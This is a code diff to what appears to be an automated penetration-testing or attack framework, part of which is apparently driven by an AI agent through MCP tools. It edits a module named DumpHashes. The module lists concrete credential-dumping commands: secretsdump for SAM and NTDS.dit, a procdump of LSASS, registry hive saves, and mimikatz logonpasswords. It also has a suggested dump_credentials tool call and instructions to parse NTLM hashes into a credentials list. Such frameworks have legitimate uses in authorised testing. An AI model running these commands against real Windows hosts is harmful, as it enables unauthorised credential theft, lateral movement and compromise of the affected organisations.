@@ -186,24 +186,37 @@ class PassTheHash(AttackModule):
 class DumpHashes(AttackModule):
     name = "DumpHashes"
     description = "SAM/SYSTEM extraction, LSASS memory dump, NTDS.dit extraction for offline cracking"
-    target_services = ["smb", "microsoft-ds", "ms-wbt-server", "rdp"]
-    target_ports = [445, 3389]
+    target_services = ["smb", "microsoft-ds"]
+    target_ports = [445]
     required_cves = []
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
-        return {
-            "status": "info",
-            "module": self.name,
-            "note": "Extracts password hashes from compromised Windows hosts for offline cracking or PtH.",
-            "techniques": [
+        return self._info_result(
+            ctx,
+            note=(
+                "Extracts password hashes from compromised Windows hosts for "
+                "offline cracking or PtH. Prefer the dump_credentials MCP tool "
+                "(secretsdump/sam_local/lsass/mimikatz/dcsync). Parse "
+                "'<user>:<uid>:<NTLM>:' lines from its output into credentials_found."
+            ),
+            evidence=[f"hash dump planned against {ctx.target_ip} (requires admin/SYSTEM)"],
+            references=[
+                "https://www.thehacker.recipes/a-d/movement/credentials/dumping",
+                "https://github.com/fortra/impacket/blob/master/examples/secretsdump.py",
+            ],
+            suggested_command=(
+                f"dump_credentials(target_ip='{ctx.target_ip}', method='secretsdump', "
+                f"username='<admin>', ntlm_hash='<NT>')"
+            ),
+            techniques=[
                 {"name": "SAM dump", "command": "impacket-secretsdump -sam SAM -system SYSTEM LOCAL"},
                 {"name": "LSASS dump", "command": "procdump.exe -accepteula -ma lsass.exe lsass.dmp"},
                 {"name": "NTDS.dit", "command": "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"},
                 {"name": "Registry save", "command": "reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM system.save"},
                 {"name": "Mimikatz", "command": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit"},
             ],
-            "prerequisites": ["Administrator/SYSTEM access on target", "Ability to upload/execute tools"],
-        }
+            prerequisites=["Administrator/SYSTEM access on target", "Ability to upload/execute tools"],
+        )
 
 
 # ---------------------------------------------------------------------------
